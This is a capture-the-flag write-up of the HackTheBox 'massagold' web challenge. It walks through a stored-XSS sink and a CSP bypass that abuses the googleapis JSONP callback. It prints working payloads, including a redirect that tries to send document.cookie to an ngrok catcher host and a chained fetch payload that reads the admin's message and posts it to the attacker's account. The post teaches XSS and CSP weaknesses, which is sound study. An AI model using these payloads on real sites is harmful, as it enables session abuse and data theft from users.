---
layout: post
title: "Massagold"
date: 2026-07-26 00:00:00 -0700
categories: ctfs
description: A CSP allow-lists googleapis.com for scripts but the app never actually loads anything from it — its JSONP callback parameter becomes a script-injection gadget that clears the CSP, delivering a stored, unescaped message body into an admin bot's session; two same-origin fetches then ride the bot's cookie past httpOnly and connect-src restrictions to read the flag message and mail its contents back to the attacker's own inbox.
parent: HackTheBox - Apocalypse '26
grand_parent: CTF Events
event: "hackthebox-apocalypse"
tags:
  - "web"
  - "xss"
  - "stored-xss"
  - "csp-bypass"
  - "jsonp"
  - "cyberapocalypse"
---

## Engagement Notes

`massagold` is a web-category challenge from Cyberapocalypse 2026. The framing:

> Someone is using sealed harbor letters to make Damas's ships look late, unsafe, and
> unreliable. If this continues, Eastreach merchants will leave his ports and his
> enemies will profit from the panic. Lyra needs to steal the first false letter from
> the harbor office and bring it to Damas, because proof of sabotage is the only thing
> that can make him open his routes to Stormbound.

Translated out of the fiction: a mail app with an `admin` account, a stored-XSS sink
in the message viewer, and a Content-Security-Policy tight enough that the usual
`<script>` payload does nothing. The way through the CSP is what makes the box —
the policy trusts `https://www.googleapis.com` for scripts even though the app never
loads anything from that origin itself, and googleapis's own JSONP callback parameter
becomes the gadget that turns that unused trust into arbitrary script execution.

## Attack path

1. `views/message.ejs` renders a letter's body with unescaped EJS buffering
   (`<%- message.content %>`) — a stored-XSS sink if message content can carry HTML.
2. The CSP's `script-src 'self' https://www.googleapis.com` blocks a plain injected
   `<script>` tag, but googleapis is never actually used by the app — a hint that its
   trust is the intended way in.
3. `curl`-fuzzing googleapis's JSONP `callback` parameter shows it validates callback
   names server-side; a semicolon/quote breakout is rejected with a 400.
4. `callback=alert(1)` is accepted; a message containing
   `<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>`
   sent to `admin` fires the alert in the bot's session.
5. `document.cookie` exfil attempts fail — the session cookie is `httpOnly`; confirmed
   directly in-browser (`document.cookie` → `""`).
6. `fetch()` inside the callback gadget works for same-origin requests but is blocked
   cross-origin by the CSP's `connect-src 'self'`.
7. The final payload chains two same-origin fetches inside the callback gadget: GET
   `/messages/1` (resolved in the admin bot's own authenticated session, riding its
   cookie implicitly) and POST the response body back into the app as a new message to
   the attacker's own account.
8. The exfiltrated copy of message 1 lands in the attacker's inbox; the flag is inside
   markup the UI normally hides behind a click-to-open "seal," so it's read from page
   source instead of the rendered page.

## The unescaped sink and the CSP hint

The message viewer renders letter content unescaped:

```
<!doctype html>
<html lang="en">
<%- include('partials/head', { title: 'Message' }) %>
<body>
  <%- include('partials/nav') %>
  <main>
    <h1 data-message-title>Sealed Letter</h1>
    <section class="sealed-scroll" data-sealed-scroll>
      <button class="open-seal-button" type="button" data-open-seal aria-label="Open sealed letter"></button>
    </section>
    <section class="actual-scroll read-scroll" data-opened-scroll hidden>
      <div class="scroll-content">
        <div class="letter-meta">
          <strong>From: <%= message.sender_username %></strong>
          <span class="muted">Sent by <%= message.sender_username %> on <%= message.created_at %></span>
        </div>
        <pre class="letter-copy"><%- message.content %></pre>
      </div>
    </section>
  </main>
  <script src="/assets/message.js" defer></script>
</body>
</html>
```

Per EJS's own docs, `<%= %>` escapes HTML by default and `<%- %>` doesn't — so
`message.content` renders raw. `message.sender_username` and `message.created_at`
use the escaped form and aren't viable sinks.

That alone isn't enough: the app's CSP is

```js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'self'",
      "script-src 'self' https://www.googleapis.com",
      "style-src 'self'",
      "img-src 'self' data:",
      "font-src 'self' data:",
      "connect-src 'self'",
      "object-src 'none'",
      "form-action 'self'",
      "frame-ancestors 'none'"
    ].join('; ')
  );
  next();
});
```

`googleapis.com` isn't referenced anywhere else in the app — a candidate signal that
it's there specifically to be leveraged as a script-source gadget, backed by a
[Security StackExchange writeup on trusted-CDN JSONP-callback XSS](https://security.stackexchange.com/questions/138203/how-does-a-trusted-maps-googleapis-com-in-csp-enable-an-xss-vulnerability-json)
as background on the bypass class.

## Fuzzing the JSONP callback

`www.googleapis.com/customsearch/v1` validates its `callback` parameter server-side:

```
!curl "https://www.googleapis.com/customsearch/v1?callback=x;alert(1);y%22"
--- OUTPUT ---
// API callback
PAYLOAD;x\"({
  "error": {
    "code": 400,
    "message": "Invalid JSONP callback name: 'PAYLOAD;x\"'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed.",
    "errors": [
      {
        "message": "Invalid JSONP callback name: 'PAYLOAD;x\"'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed.",
        "domain": "global",
        "reason": "badRequest"
      }
    ],
    "status": "INVALID_ARGUMENT"
  }
}
);
```

A semicolon/quote breakout is rejected outright. But:

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)"></script>
```

is accepted, despite `(` and `)` not being in the allow-list the 400 response just
described.

> ⚠️ Observed-only: why `alert(1)` cleared the same validator that rejected the
> semicolon/quote payload was never actually determined — it was confirmed empirically
> to fire, not traced to a mechanism.

## Confirming execution in the admin bot

The `alert(1)` payload is sent as a message to `admin`:

![Composing a letter to admin containing the JSONP callback=alert(1) script tag payload](/assets/images/ctf/events/hackthebox-apocalypse-26/massagold/composed-payload-message-to-admin.png)

The bot's automatic visit fires it:

![Alert dialog from localhost:8081 showing "1" — confirmation the JSONP-gadget payload executed](/assets/images/ctf/events/hackthebox-apocalypse-26/massagold/alert-1-fires-via-jsonp-callback.png)

## Chasing document.cookie down a dead end

With execution confirmed, the next target is the session cookie itself:

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=window.location.replace(`http://6.tcp.us-cal-1.ngrok.io:11878/?${document.cookie}`)"></script>
```

> The window location works fine but document.cookie doesn't get populated.

Same channel, swapped for a readable property, confirms the redirect-exfil mechanism
itself works fine for non-cookie state:

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=window.location.replace(`http://6.tcp.us-cal-1.ngrok.io:11878/f=${window.document.title}`)"></script>
```

```
[11:09:15.526] GET /f=Message HTTP/1.1
```

Directly probing `document.cookie` in-browser confirms it's empty:

![Browser console showing document.cookie evaluating to an empty string](/assets/images/ctf/events/hackthebox-apocalypse-26/massagold/document-cookie-empty-console.png)

> cookie: { httpOnly: true }
>
> This is keeping me from seeing the cookie from js, it's only available in the
> browser

`httpOnly` on the session cookie (`server.js`) is what blocks it — not a flaw in the
exfil channel itself.

## Riding the bot's session home

`fetch()` inside the callback gadget is confirmed working for same-origin requests:

> I can prove that fetch is working for local resources, but will hit cors errors
> trying to fetch external, when I run this locally and pass this payload, I can see
> the call happen from my payload

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=fetch('/')"></script>
```

![Local browser network tab: a fetch('/') request against localhost:8081 succeeding, alongside a favicon.ico 404](/assets/images/ctf/events/hackthebox-apocalypse-26/massagold/local-fetch-same-origin-vs-cors.png)

Since the cookie can't be read directly and cross-origin `fetch` is blocked by
`connect-src 'self'`, the payload doesn't need to exfiltrate the cookie at all — it can
just act *as* the admin bot, same-origin, and hand the result back through the app's
own message-sending feature:

```html
<script src="https://www.googleapis.com/customsearch/v1?callback=fetch('/messages/1').then(function(res) {return res.text();}).then(function(bod) {fetch(`/messages`,{method:'POST',body:new URLSearchParams({'to_username':'tokugero','content':bod})})});"></script>
```

Both `fetch` calls are same-origin, so `connect-src 'self'` doesn't block either one;
the admin bot's session cookie rides along implicitly on the GET.

> 🧠 `/messages/1` wasn't a blind guess at the target ID — a local copy of the
> challenge environment was spun up separately and logged into as `admin`, which showed
> directly that message id 1 was seeded with the flag data before this payload was ever
> sent against the real target.

## Reading the exfiltrated letter

The message UI hides a letter's body behind a click-to-open "seal" button, and the
admin bot never clicks anything — so the exfiltrated copy that lands in the
attacker's own inbox needed its source read directly rather than viewed normally:

> I had to read the page source so I could see the hidden text since admin doesn't
> click the seal

![Page source of the exfiltrated message, showing "From: archivist" and the flag inside a hidden pre block](/assets/images/ctf/events/hackthebox-apocalypse-26/massagold/exfiltrated-flag-page-source.png)

```
HTB{m3554g3_1n_7h3_cu570dy_ch41n_a417af7b20a21116c45174dc025a19ce}
```

## What didn't work

- **`callback=x;alert(1);y%22`** — rejected by googleapis's own JSONP validator with a
  400 (`Invalid JSONP callback name`). A real probe with a real rejection, not a
  fabricated attempt.
- **Reading `document.cookie` directly** — the session cookie is `httpOnly`
  (`server.js`), unreachable from JS regardless of delivery channel. Superseded by
  riding the bot's session implicitly through same-origin `fetch` rather than reading
  the cookie value at all.
- **Cross-origin `fetch` to an external catcher** — blocked by the CSP's
  `connect-src 'self'`. This is why the final payload posts the exfiltrated content
  back into the app itself instead of out to a listener.
- **XSStrike** (`s0md3v/XSStrike`) was tried against the target at some point in the
  engagement, but wasn't used effectively — there wasn't a good way to get it to
  validate its own output against this CSP-gated, JSONP-callback-gadget style of
  vulnerability, and it doesn't appear in the working chain above.

## Tools used

| Tool | Role on this box | Reference |
|---|---|---|
| `curl` | Fuzzed the googleapis JSONP `callback` parameter's server-side validation | — |
| Browser DevTools | Confirmed `document.cookie` emptiness and inspected the network tab for same-origin vs. CORS-blocked `fetch` calls | — |
| ngrok | Out-of-band HTTP catcher for the redirect-based exfil probes (`window.location.replace`) | [ngrok.com](https://ngrok.com/) |
| XSStrike | Attempted against the target; not used effectively — no working output validation against this CSP/JSONP-gadget style of sink | [s0md3v/XSStrike](https://github.com/s0md3v/XSStrike) |

## Tactics (MITRE ATT&CK)

No MITRE ATT&CK Enterprise technique cleanly matches this chain. Several
initial-access and browser-execution techniques were considered and rejected:

> **Not tagged, and why:** [**T1190 — Exploit Public-Facing
> Application**](https://attack.mitre.org/techniques/T1190/) was considered — this is,
> after all, a web-application vulnerability chain — but its definition scopes the
> technique to gaining *initial access to a network* through an internet-facing
> weakness. Nothing here reaches a network or a host; the entire chain stays inside
> the app's own data layer and the admin bot's browser sandbox. [**T1059.007 —
> JavaScript**](https://attack.mitre.org/techniques/T1059/007/), [**T1189 — Drive-by
> Compromise**](https://attack.mitre.org/techniques/T1189/), and [**T1185 — Browser
> Session Hijacking**](https://attack.mitre.org/techniques/T1185/) were also
> considered for the script-execution and session-riding steps, but each is scoped to
> adversary-supplied malware injecting into or exploiting a browser process from the
> outside — not a legitimate application feature (its own message-composition and
> message-viewing endpoints) being used, through a stored-XSS delivery mechanism, to
> read data the requesting session was already authorized to see.

## Lessons

- There are a lot of ways to exfiltrate data even when a strict CSP blocks the obvious
  channel out — riding an already-privileged session home through the app's own
  same-origin features, rather than trying to smuggle data across `connect-src`, was
  the deciding move here.
- A CSP allow-listing a trusted third-party origin the app never actually uses for
  anything is worth treating as a hint, not a footnote — googleapis's own JSONP
  callback endpoint is a well-documented script-injection gadget once it's inside
  `script-src`.

## Further reading

**Used during the engagement:**
- [tj/ejs — README, "Features" section](https://github.com/tj/ejs#features) — confirms
  `<%= %>` escapes and `<%- %>` doesn't.
- [Security StackExchange — how a trusted `maps.googleapis.com` in CSP enables an XSS
  vulnerability (JSONP)](https://security.stackexchange.com/questions/138203/how-does-a-trusted-maps-googleapis-com-in-csp-enable-an-xss-vulnerability-json) —
  background on the CSP-trusted-JSONP-callback bypass class.

---

*Provenance: commands, outputs, and flags are transcribed from the engagement
notebook. External facts (EJS escaping semantics, the CSP/JSONP bypass background,
MITRE technique definitions) are linked to their source and were fetched, not
recalled.*
